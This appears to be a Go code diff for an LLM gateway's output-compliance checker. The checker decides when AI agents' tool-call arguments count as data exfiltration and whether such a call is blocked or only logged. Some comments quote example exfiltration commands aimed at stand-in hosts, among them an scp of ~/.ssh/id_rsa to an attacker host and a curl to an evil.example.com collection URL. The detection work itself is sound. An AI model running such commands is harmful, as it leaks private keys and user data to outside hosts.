@@ -3,13 +3,18 @@ package sanitize
 import (
 	"bytes"
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"net"
+	"slices"
+	"strconv"
 	"strings"
 
 	compliancehook "github.com/kaixuan/llm-gateway-go/domains/hooks/outputcompliance"
 	"github.com/kaixuan/llm-gateway-go/domains/outputcompliance"
+	"github.com/kaixuan/llm-gateway-go/domains/sanitizerules"
 )
 
 type OutputSensitiveAction string
@@ -112,11 +117,76 @@ var inertContentTools = map[string]bool{
 	"write_to_file": true, "replace_in_file": true,
 	"apply_patch": true, "apply_patch_file": true, "str_replace_editor": true,
 	"insert_content": true,
+	// r1039（D8）：同一语义的**下划线拼写**与常见别名。
+	//
+	// 缺一个名字的代价是**双向**的：惰性豁免不生效（Write 一族里的公网 URL
+	// 引用被当成外传目的地误拦），而惰性工具上的凭据键检查照样生效。
+	// 封闭集 + 默认不豁免的规矩不变：未收录的名字一律走原有 fail-closed 检查。
+	"multi_edit": true, "notebook_edit": true, "todo_write": true, "todo_read": true,
+	"write_file": true, "file_write": true, "file_edit": true, "update_file": true,
+	"apply_diff": true,
+	// Gemini CLI 一族
+	"read_many_files": true, "search_file_content": true, "list_directory": true,
+}
+
+// normalizedToolName 归一化工具名：去掉 MCP 命名空间前缀后取基名。
+//
+// r1039（D8）：MCP 工具名带命名空间（mcp__<server>__<tool>），但**语义由客户端
+// 声明的服务器与工具决定**（信任边界内），基名与内建名同义时要同等对待：
+//
+//	mcp__acme__execute_command → execute_command（本地执行）
+//	mcp__acme__write_file      → write_file（惰性内容）
+//
+// 未收录的基名（如 mcp__acme__deploy）**不**获得任何豁免——「deploy」既可能
+// 是本地动作也可能是网络动作，按名字猜正是 owner 说的「放大范围」。
+func normalizedToolName(name string) string {
+	n := strings.ToLower(strings.TrimSpace(name))
+	if rest, ok := strings.CutPrefix(n, "mcp__"); ok {
+		if _, tool, found := strings.Cut(rest, "__"); found && tool != "" {
+			return tool
+		}
+	}
+	return n
 }
 
 // isInertContentTool 报告 name 是否为惰性内容工具（参数不触网）。
 func isInertContentTool(name string) bool {
-	return inertContentTools[strings.ToLower(strings.TrimSpace(name))]
+	return inertContentTools[normalizedToolName(name)]
+}
+
+// localExecTools 是在客户端本地执行的命令类工具（参数会进 shell/exec，但
+// **不是**「把内容 POST 到外网」的专用上传工具）。比较前小写化。
+//
+// 2026-10-17 r1035（154 request 913cf85b… / client 59d936b8…）：托管规则
+// `pii.address.egress`（type=custom, kind=pattern）把 Bash 参数里中文路径/
+// 文档字样（含「路/号/室」）当成地址整条 `output_policy_blocked`。地址类
+// custom 规则的语义是数据分类脱敏，不是外传目的地；对本地执行工具硬拦会
+// 直接打断 coding agent，且拦不住「模型侧已见到该文本」（响应已由供应商生成）。
+//
+// 对这类工具：仍硬拦真正的网络目的地（network_destination / 公网 IP/域名）
+// 与 secret；跳过其余 custom 分类规则（address/passport/iban…）。
+var localExecTools = map[string]bool{
+	"bash": true, "shell": true, "zsh": true, "sh": true,
+	"exec_command": true, "run_terminal_cmd": true, "run_command": true,
+	"execute": true, "terminal": true, "powershell": true, "cmd": true,
+	// r1039（D8）：真实客户端的常见拼写。缺一个名字的代价同样是双向的：
+	// 方向规则（builtin.egress_sink）不参与 ⇒ 漏拦；本地执行的分类规则
+	// 豁免不生效 ⇒ 误拦（发货地址 / 中文路径这类正常参数被整条掐断）。
+	"execute_command":      true, // Cline / Roo Code
+	"run_shell_command":    true, // Gemini CLI
+	"run_terminal_command": true,
+	"run_in_terminal":      true, // VS Code Copilot
+	"execute_bash_command": true, // Kiro
+}
+
+func isLocalExecTool(name string) bool {
+	return localExecTools[normalizedToolName(name)]
+}
+
+// isEgressDestinationKind reports whether a custom-typed fragment is an actual
+// network-destination rule (vs a PII classifier reused on the egress scope).
+func isEgressDestinationKind(fragment SensitiveFragment) bool {
+	return fragment.Kind == "network_destination"
 }
 
 type outputSensitiveChecker struct {
@@ -128,6 +198,7 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 	if c.sanitizer == nil {
 		return nil, ErrNilSanitizer
 	}
+	ctx = WithAuthenticatedTenant(ctx, tenant)
 	if label == "__tool_fragment" {
 		// Full JSON is checked at terminal/EOF; fragments may contain opaque data
 		// or split escapes that cannot be interpreted independently.
@@ -144,12 +215,13 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 		if err := decoder.Decode(&value); err != nil {
 			return nil, err
 		}
-		unsafe, err := c.unsafeToolValue(ctx, value, "", 0, toolName)
+		issue := outputcompliance.ComplianceIssue{}
+		unsafe, err := c.unsafeToolValueDetail(ctx, value, "", 0, toolName, "$", &issue)
 		if err != nil {
 			return nil, err
 		}
 		if unsafe {
-			return &outputcompliance.ComplianceResult{Blocked: true}, nil
+			return &outputcompliance.ComplianceResult{Blocked: true, Issues: []outputcompliance.ComplianceIssue{issue}}, nil
 		}
 		return &outputcompliance.ComplianceResult{Compliant: true, RedactedOutput: text}, nil
 	}
@@ -157,9 +229,11 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 	// 的值是登录身份不是机密，且裸用户名永远不可能以占位符形态出现，
 	// 按 credentialField 一律阻断等于结构性掐断一切带用户名的工具调用。
 	// r1024b：模型自造的占位拼写同理放行（见 placeholderCredentialValues）。
-	if label != "" && secretCredentialField(label) && text != "" && !isMarker && !isPlaceholderCredentialValue(label, text) {
+	ctx = WithRuleField(ctx, "", label)
+	if !c.managed() && label != "" && secretCredentialField(label) && text != "" && !isMarker && !isPlaceholderCredentialValue(label, text) && secretFieldBlockAllowed() &&
+		!egressReleaseAllowed(ctx, secretFieldRuleID, label, text) {
 		marker := RedactionMarker(TypeSecret)
-		return &outputcompliance.ComplianceResult{Blocked: true, RedactedOutput: marker, Issues: []outputcompliance.ComplianceIssue{{Type: "sensitive", Subtype: "credential", Content: marker, Severity: 8}}}, nil
+		return &outputcompliance.ComplianceResult{Blocked: true, RedactedOutput: marker, Issues: []outputcompliance.ComplianceIssue{{Type: "sensitive", Subtype: "credential", Content: marker, Severity: 8, RuleID: secretFieldRuleID}}}, nil
 	}
 	return c.Check(ctx, tenant, text)
 }
@@ -171,6 +245,10 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 // 检查——但密码族凭据键检查（secretCredentialField）对任何工具都保留：写文件
 // 写出的明文凭据与触网无关，属另一条底线。身份族字段（r1024）不在此列。
 func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any, label string, depth int, toolName string) (bool, error) {
+	return c.unsafeToolValueDetail(ctx, value, label, depth, toolName, "$", nil)
+}
+
+func (c *outputSensitiveChecker) unsafeToolValueDetail(ctx context.Context, value any, label string, depth int, toolName, path string, issue *outputcompliance.ComplianceIssue) (bool, error) {
 	if depth > maxNativeToolInputDepth {
 		return false, errors.New("output tool input depth exceeded")
 	}
@@ -179,7 +257,9 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 		// r1024b：模型自造的占位拼写（"PLACEHOLDER"/"TODO"/"<...>"）不是
 		// 泄漏的真值，不触发密码族明文阻断——否则并行工具调用里一个早产
 		// 的占位值会把同轮全部合法调用一并掐断。
-		if _, marker := ParsePlaceholder(value); secretCredentialField(label) && value != "" && !marker && !isPlaceholderCredentialValue(label, value) {
+		if _, marker := ParsePlaceholder(value); !c.managed() && secretCredentialField(label) && value != "" && !marker && !isPlaceholderCredentialValue(label, value) && secretFieldBlockAllowed() &&
+			!egressReleaseAllowed(ctx, secretFieldRuleID, path, value) {
+			setToolIssueRule(issue, "credential", path, secretFieldRuleID)
 			return true, nil
 		}
 		document := bytes.TrimSpace([]byte(value))
@@ -190,14 +270,21 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 			if err := decoder.Decode(&embedded); err != nil {
 				return false, err
 			}
-			return c.unsafeToolValue(ctx, embedded, label, depth+1, toolName)
+			return c.unsafeToolValueDetail(ctx, embedded, label, depth+1, toolName, path, issue)
 		}
-		if isInertContentTool(toolName) {
+		if !c.managed() && isInertContentTool(toolName) {
 			// 惰性内容载体（Write/Edit 写文件等）：参数是被写的数据，不是被
 			// 执行的命令。其中的 URL/地址是文本引用，不构成外传目的地——
 			// 与 assistant 纯文本出现 URL 时的处理（脱敏路径、不阻断）对齐。
 			return false, nil
 		}
+		if _, marker := ParsePlaceholder(value); marker {
+			return false, nil
+		}
+		if secretCredentialField(label) && isPlaceholderCredentialValue(label, value) {
+			return false, nil
+		}
+		ctx = WithRuleField(ctx, toolName, label)
 		fragments, err := c.detectEgress(ctx, value)
 		if err != nil {
 			return false, err
@@ -213,10 +300,23 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 			// 工具名）。与 r1024 的身份/密码族拆分同一条原理：身份不是机密。
 			// 其余非地址片段（email/secret 等）保持原有阻断契约
 			// （r1017 公网 user@host / r1028 真实凭据样值）。
-			if fragment.Type == TypeAccount {
+			if c.managed() && isInertContentTool(toolName) && slices.Contains(fragment.Exemptions, "inert_tool") {
+				c.observe(ctx, fragment, "exempted")
 				continue
 			}
-			if isNonExfiltrationFragment(fragment) {
+			if fragment.Type == TypeAccount && (!c.managed() || slices.Contains(fragment.Exemptions, "identity")) {
+				c.observe(ctx, fragment, "exempted")
+				continue
+			}
+			// r1033：路径/版本嵌入的四元组不是外传目的地（jdk-17.0.20.1+1）。
+			// server_ip 的 `\b` 在 `-`/`+` 处仍成词界，会把 JDK/Node 等版本号
+			// 当成公网 IP 整条阻断——ZCode/Maestro 装环境命令因此挂死。
+			if isPathOrVersionEmbeddedAddress(value, fragment) && (!c.managed() || slices.Contains(fragment.Exemptions, "nonroutable_destination")) {
+				c.observe(ctx, fragment, "exempted")
+				continue
+			}
+			if isNonExfiltrationFragment(fragment) && (!c.managed() || slices.Contains(fragment.Exemptions, "nonroutable_destination")) {
+				c.observe(ctx, fragment, "exempted")
 				// 2026-10-08 minimax-m3/glm-5.3 fail-closed incident: the
 				// server_ip pattern matches any IPv4, and dev tooling echoes
 				// 127.0.0.1 / RFC1918 targets in model-generated commands
@@ -228,36 +328,124 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 				// (TestGeneratedSensitiveToolOperationsAreBlocked contract).
 				continue
 			}
+			// r1035：本地执行 / 惰性内容工具上的 custom 分类规则（address 等）
+			// 不是外传目的地。仍拦 network_destination / secret / 公网 IP·域名。
+			// 托管规则若未登记 inert_tool 豁免，旧逻辑会把 Write 里的中文地址
+			// 与 Bash 路径一并硬拦——与 r1020 载体分流同向补齐。
+			if (isLocalExecTool(toolName) || isInertContentTool(toolName)) &&
+				fragment.Type == TypeCustom && !isEgressDestinationKind(fragment) {
+				c.observe(ctx, fragment, "exempted")
+				continue
+			}
+			// r1039（D7）：凭据字段上的**示例值**（abc123 / *** / user0000 …）
+			// 不是泄漏的真值，凭据字段规则不该把它整条拦下。
+			//
+			// 适用面刻意窄：只在「凭据字段 + secret 片段 + pattern 形态规则」上
+			// 生效。赋值型规则（secret.password 匹配 `password=xxx`）的 kind 是
+			// credential_assignment，不在这一族里，照拦。
+			if fragment.Type == TypeSecret && fragment.Kind == "pattern" &&
+				secretCredentialField(label) && isDummyCredentialValue(fragment.Value) {
+				c.observe(ctx, fragment, "exempted")
+				continue
+			}
+			// r1037（2026-10-20，211）：硬阻断由**清单**显式开启。清单外的
+			// 规则只记录（命中仍进 sanitize_rule_events 台账），不掐断工具调用。
+			// owner 口径：Bash 参数里出现公网主机 / 公网 IP / `password=`
+			// 字面量这类**形状匹配**，默认不终止回合——我们要操作外部主机的
+			// 数据，那是正常需求。
+			if !fragmentMayBlock(fragment) {
+				c.observe(ctx, fragment, "log")
+				continue
+			}
+			// r1039（D4）：服务端持有的**放行**记录（租户 + 规则 [+ 载荷摘要]）。
+			// 客户端无法自带任何东西绕过它——放行决定只在网关进程内。
+			if egressReleaseAllowed(ctx, fragmentRuleID(fragment), path, fragment.Value) {
+				c.observe(ctx, fragment, "exempted")
+				continue
+			}
+			c.observe(ctx, fragment, "block")
+			reason := string(fragment.Type)
+			if scopedType(fragment.Type) || fragment.Type == TypeEmail {
+				reason = "egress_destination"
+			}
+			setToolIssueRule(issue, reason, path, fragment.RuleID)
 			return true, nil
 		}
 		// 2026-10-11：ScopeEgress 只匹配 IP 字面量规则，域名形式的外传目的地
 		// （curl http://evil.example.com/collect）一律畅通。判定与 IP 侧同一条
 		// 底线：默认公网可达即阻断，只豁免明确不可路由的主机。见 egress_host.go。
 		// 放在片段循环之后：两套规则互相独立，私网 IP 的豁免不会被这里撤销。
-		if hasPublicHostDestination(value) {
+		//
+		// r1037（2026-10-20，211）：这一段是**两条互相独立的规则**，各有各的
+		// 清单键，运维可以分开开关：
+		//
+		//	builtin.network_destination —— **形状**规则：参数里提到了公网主机
+		//	                              （curl 下个 SDK、clone 一个仓库都算）。
+		//	                              旧语义（r1016/r1028 契约），默认不在
+		//	                              清单里 ⇒ 只记录不终止回合。
+		//	builtin.egress_sink        —— **方向**规则：把本地数据**送往**公网
+		//	                              （请求体 / 上传 / 自定义头 / 本地数据
+		//	                              插值 / 发送型客户端）。精确、不误伤
+		//	                              下载，是「要拦就拦真的」的那一档。
+		//
+		// 形状规则只在非托管路径显式判定：托管路径的 `network_destination`
+		// 片段规则已经覆盖了同一形状（见 detector.go）。
+		if !c.managed() && hasPublicHostDestination(value) &&
+			sanitizerules.HardBlockAllowed("egress", networkDestinationRuleID) &&
+			!egressReleaseAllowed(ctx, networkDestinationRuleID, path, value) {
+			setToolIssueRule(issue, "egress_destination", path, networkDestinationRuleID)
 			return true, nil
+		}
+		// 方向规则对托管/非托管**都**生效：它不在规则快照里，而是代码级的
+		// 判定 ⇒ 211 已发布的快照版本 1 无需重发就能用。
+		//
+		// 只对**本地执行类工具**生效（Bash/shell/exec…）：只有那里的参数才是
+		// 「一条会被执行的命令」。惰性内容工具（Write/Edit）的内容是被写下去
+		// 的数据，里面出现 URL 是文档，不是命令 —— r1035 已有同款分流。
+		//
+		// 命中**一律进台账**（sanitize_rule_events）：不在清单里记 log、
+		// 在清单里记 block —— 与形状规则同一口径，运维据此判断「该不该把
+		// 这条规则加进清单」。（方向规则是代码级判定、没有快照规则可 observe，
+		// 早期版本只落在容器日志里，台账是空的 ⇒ 观测缺口。）
+		if isLocalExecTool(toolName) && hasPublicHostSink(value) {
+			sink := SensitiveFragment{Type: TypeCustom, Kind: "egress_sink", RuleID: egressSinkRuleID}
+			if !sanitizerules.HardBlockAllowed("egress", egressSinkRuleID) {
+				c.observe(ctx, sink, "log")
+			} else if egressReleaseAllowed(ctx, egressSinkRuleID, path, value) {
+				// r1039（D4）：服务端持有的放行记录命中 ⇒ 放行并记账。
+				c.observe(ctx, sink, "exempted")
+			} else {
+				c.observe(ctx, sink, "block")
+				setToolIssueRule(issue, "egress_destination", path, egressSinkRuleID)
+				return true, nil
+			}
 		}
 		return false, nil
 	case map[string]any:
 		// r1024：身份族与密码族都保持「非字符串形状 fail-closed」（畸形形状是
 		// 绕过手法，与值是否机密无关）；只有字符串明文按族分流（见上）。
-		if credentialField(label) {
+		if credentialField(label) && secretFieldBlockAllowed() {
+			setToolIssueRule(issue, "credential", path, secretFieldRuleID)
 			return true, nil
 		}
 		for key, child := range value {
 			if compliancehook.IsOpaqueToolValue(key, child) {
 				continue
 			}
-			unsafe, err := c.unsafeToolValue(ctx, child, key, depth+1, toolName)
+			unsafe, err := c.unsafeToolValueDetail(ctx, child, key, depth+1, toolName, path+"."+key, issue)
 			if unsafe || err != nil {
 				return unsafe, err
 			}
 		}
 	case json.Number, bool:
-		return credentialField(label), nil
+		if credentialField(label) && secretFieldBlockAllowed() {
+			setToolIssueRule(issue, "credential", path, secretFieldRuleID)
+			return true, nil
+		}
+		return false, nil
 	case []any:
-		for _, child := range value {
-			unsafe, err := c.unsafeToolValue(ctx, child, label, depth+1, toolName)
+		for i, child := range value {
+			unsafe, err := c.unsafeToolValueDetail(ctx, child, label, depth+1, toolName, path+"["+strconv.Itoa(i)+"]", issue)
 			if unsafe || err != nil {
 				return unsafe, err
 			}
@@ -291,6 +479,99 @@ func isNonRoutableAddressFragment(fragment SensitiveFragment) bool {
 		return false
 	}
 	return isNonExfiltrationAddress(fragment.Value)
+}
+
+// secretFieldRuleID 是「凭据字段明文」这条守卫的规则 ID。
+//
+// 与托管快照里的 `builtin.secret_field.egress` **同名**：运维用同一个键就能在
+// 托管/非托管两条路径上开关它，不必记两套名字。
+const secretFieldRuleID = "builtin.secret_field.egress"
+
+// networkDestinationRuleID 是「参数里提到了公网主机」这条**形状**规则的 ID。
+//
+// 与托管快照里的 `builtin.network_destination` 同名 ⇒ 同一个键能同时开关
+// 托管路径的片段规则与非托管路径的显式判定。
+const networkDestinationRuleID = "builtin.network_destination"
+
+// egressSinkRuleID 是「把本地数据送往公网主机」这条**方向**规则的 ID。
+//
+// r1037（2026-10-20，211）：形状规则（networkDestinationRuleID）会把
+// 「下载一个 SDK 镜像」也算成外传 —— 211 事故就是这么来的。方向规则只认
+// 真正的数据外流，是「要拦就拦真的」的那一档。
+//
+// 它**不在规则快照里**，是代码级判定 ⇒ 已发布的快照无需重发即可用；
+// 清单键用 `egress:builtin.egress_sink` 打开。
+const egressSinkRuleID = "builtin.egress_sink"
+
+// secretFieldBlockAllowed 报告「凭据字段明文」这条守卫是否允许硬阻断。
+//
+// r1037（2026-10-20，211）：默认清单里没有 egress ⇒ 这条守卫默认只记录不终止。
+func secretFieldBlockAllowed() bool {
+	return sanitizerules.HardBlockAllowed("egress", secretFieldRuleID)
+}
+
+// EgressPayloadDigest 计算被拦载荷的摘要（规则 ID + 参数路径 + 载荷值）。
+//
+// r1039（D4）：放行要能绑定到**这一次**的具体载荷——放行一次
+// `scp ~/.ssh/id_rsa attacker@files.example.com:/tmp/x` 不等于放行下一次
+// 同规则的另一条命令。
+//
+// 摘要**不出现在客户端响应里**：被拦的值可能是凭据，它的摘要落进响应/日志
+// 就是个可爆破的口子（与 r1022「payload preview 不进日志」同一条纪律）。
+// 需要精确放行的管理面用这个函数算摘要，与守卫侧算法一致。
+func EgressPayloadDigest(ruleID, path, value string) string {
+	sum := sha256.Sum256([]byte(ruleID + "\x00" + path + "\x00" + value))
+	return hex.EncodeToString(sum[:])
+}
+
+// egressReleaseAllowed 报告这条被拦载荷是否已被**服务端持有**的放行记录覆盖。
+//
+// r1039（D4）：放行决定在网关进程内（domains/sanitizerules.EgressRelease），
+// 客户端读不到也写不了——客户端自带一个头就能绕过守卫的话，hop-header 豁免
+// 的教训就重演一遍。
+//
+// 租户为空 ⇒ 不放行（fail-closed）：没有租户就没有边界。
+func egressReleaseAllowed(ctx context.Context, ruleID, path, value string) bool {
+	tenant := authenticatedTenant(ctx)
+	if tenant == "" {
+		return false
+	}
+	return sanitizerules.EgressReleaseAllowed(tenant, "egress", ruleID, EgressPayloadDigest(ruleID, path, value))
+}
+
+// setToolIssue records rule and schema location, never the rejected value.
+func setToolIssue(issue *outputcompliance.ComplianceIssue, reason, path string) {
+	setToolIssueRule(issue, reason, path, "")
+}
+
+// setToolIssueRule 同 setToolIssue，但带上规则 ID。
+//
+// owner 口径（2026-10-20）：「就算是被拦截，应该在中断时反馈给客户因为什么
+// 规则被拦截，不要搞空响应」——规则名是这句话里唯一可机器消费的部分。
+func setToolIssueRule(issue *outputcompliance.ComplianceIssue, reason, path, ruleID string) {
+	if issue != nil {
+		*issue = outputcompliance.ComplianceIssue{Type: "sensitive", Subtype: reason, Location: path, Content: RedactionMarker(TypeSecret), Severity: 8, Score: 1, RuleID: ruleID}
+	}
+}
+
+// fragmentMayBlock 报告该片段对应的规则是否在硬阻断清单里。
+//
+// 规则 ID 缺失时（极老的形态）按类型给一个可读键，保证「说得清是哪条规则」
+// 这件事不会因为缺 ID 而退化成空。
+func fragmentMayBlock(fragment SensitiveFragment) bool {
+	id := fragment.RuleID
+	if id == "" {
+		id = "builtin." + string(fragment.Type)
+	}
+	return sanitizerules.HardBlockAllowed("egress", id)
+}
+
+// fragmentRuleID 取片段对应的规则 ID（与 fragmentMayBlock 同一口径）。
+func fragmentRuleID(fragment SensitiveFragment) string {
+	if fragment.RuleID != "" {
+		return fragment.RuleID
+	}
+	return "builtin." + string(fragment.Type)
 }
 
 // isNonExfiltrationEmailFragment 判断一个邮箱形状的片段在 egress 语境下是不是
@@ -335,6 +616,44 @@ func isNonExfiltrationFragment(fragment SensitiveFragment) bool {
 	return isNonExfiltrationEmailFragment(fragment)
 }
 
+// isPathOrVersionEmbeddedAddress 判断地址片段是否嵌在路径名/版本号里，而非
+// 独立的网络目的地。
+//
+// 2026-10-17（r1033，154 ZCode/MiniMax 生产取证）：Bash 参数
+// `.../jdk-17.0.20.1+1/Contents/Home` 被 server_ip 命中 `17.0.20.1`
+// （Apple 公网段 17.0.0.0/8），守卫整条 `output_policy_blocked`。前后字符是
+// `-` 与 `+`——词界成立，但语义是版本构建元数据，不是主机。
+//
+// 判据只看邻接字符，不枚举产品名：
+//   - 前邻是字母/数字/`_`/`-`（token 粘连：jdk-…、v18.…、OpenJDK_…）→ 豁免
+//   - 或后邻是 `+`（semver build：17.0.20.1+1，即便前邻是 `/`）→ 豁免
+//
+// 不把后邻 `-`/字母单独当豁免（避免 `203.0.113.8-exfil` / `8.8.8.8foo` 漏拦）。
+// 独立目的地（空格/`=`/`"`/`/` 之后的裸 IP、URL 主机位）不豁免。
+// `http://203.0.113.8/exfil` 前邻 `/`、后邻 `/` → 不豁免。
+func isPathOrVersionEmbeddedAddress(text string, fragment SensitiveFragment) bool {
+	switch fragment.Type {
+	case TypeServerIP, TypeInternalIP, typeServerIPv6:
+	default:
+		return false
+	}
+	if fragment.Start < 0 || fragment.End > len(text) || fragment.Start >= fragment.End {
+		return false
+	}
+	if fragment.Start > 0 && isVersionTokenGlue(text[fragment.Start-1]) {
+		return true
+	}
+	if fragment.End < len(text) && text[fragment.End] == '+' {
+		return true
+	}
+	return false
+}
+
+func isVersionTokenGlue(b byte) bool {
+	return (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z') ||
+		(b >= '0' && b <= '9') || b == '_' || b == '-'
+}
+
 // isNonExfiltrationAddress 回答「这个地址能不能是外传目的地」。
 //
 // 2026-10-11 批判性审计（承接 dc63f19ff）：原来的写法是枚举豁免谓词
@@ -372,11 +691,15 @@ func isNonExfiltrationAddress(value string) bool {
 	return false
 }
 
-func (c *outputSensitiveChecker) Check(ctx context.Context, _ string, text string) (*outputcompliance.ComplianceResult, error) {
+func (c *outputSensitiveChecker) Check(ctx context.Context, tenant string, text string) (*outputcompliance.ComplianceResult, error) {
 	if c.sanitizer == nil {
 		return nil, ErrNilSanitizer
 	}
+	ctx = WithAuthenticatedTenant(ctx, tenant)
 	fragments, err := c.sanitizer.detector.Detect(ctx, text)
+	if errors.Is(err, ErrRuleBlocked) {
+		return &outputcompliance.ComplianceResult{Blocked: true, RedactedOutput: RedactionMarker(TypeSecret)}, nil
+	}
 	if err != nil {
 		return nil, err
 	}
@@ -385,6 +708,7 @@ func (c *outputSensitiveChecker) Check(ctx context.Context, _ string, text strin
 	if len(spans) == 0 {
 		return result, nil
 	}
+	block := c.action == OutputBlock && !c.managed()
 	var safe strings.Builder
 	last := 0
 	for _, span := range spans {
@@ -392,11 +716,17 @@ func (c *outputSensitiveChecker) Check(ctx context.Context, _ string, text strin
 		safe.WriteString(RedactionMarker(span.typ))
 		last = span.end
 		result.Issues = append(result.Issues, outputcompliance.ComplianceIssue{
-			Type: "sensitive", Subtype: string(span.typ), Content: RedactionMarker(span.typ), Severity: 8, Score: 1, Redacted: c.action != OutputBlock,
+			Type: "sensitive", Subtype: string(span.typ), Content: RedactionMarker(span.typ), Severity: 8, Score: 1, Redacted: !block,
 		})
 	}
 	safe.WriteString(text[last:])
 	result.RedactedOutput = safe.String()
-	result.Blocked = c.action == OutputBlock
+	result.Blocked = block
 	return result, nil
+}
+
+func (c *outputSensitiveChecker) observe(ctx context.Context, f SensitiveFragment, action string) {
+	if d, ok := c.sanitizer.detector.(*PatternDetector); ok {
+		d.observeFragment(ctx, f, action)
+	}
 }
